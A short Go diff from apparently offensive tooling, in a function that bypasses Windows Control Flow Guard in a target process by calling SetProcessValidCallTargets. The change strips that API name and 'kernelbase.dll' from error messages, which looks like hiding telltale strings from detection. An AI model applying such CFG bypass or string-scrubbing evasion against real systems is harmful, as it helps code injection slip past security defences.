@@ -63,7 +63,7 @@ func ensureCFGBypassAPIs() {
 func cfgBypassApplyToTarget(hProcess uintptr, addr uintptr, size int) error {
 	ensureCFGBypassAPIs()
 	if !cfgBypassAvailable {
-		return fmt.Errorf("SetProcessValidCallTargets not available in kernelbase.dll")
+		return fmt.Errorf("cfg bypass API not available")
 	}
 	regionSize := uintptr((size + 0xFFF) &^ 0xFFF)
 	if regionSize == 0 {
@@ -81,7 +81,7 @@ func cfgBypassApplyToTarget(hProcess uintptr, addr uintptr, size int) error {
 		uintptr(unsafe.Pointer(&target)),
 	)
 	if ret == 0 {
-		return fmt.Errorf("SetProcessValidCallTargets failed: %w", err)
+		return fmt.Errorf("cfg bypass call failed: %w", err)
 	}
 	return nil
 }
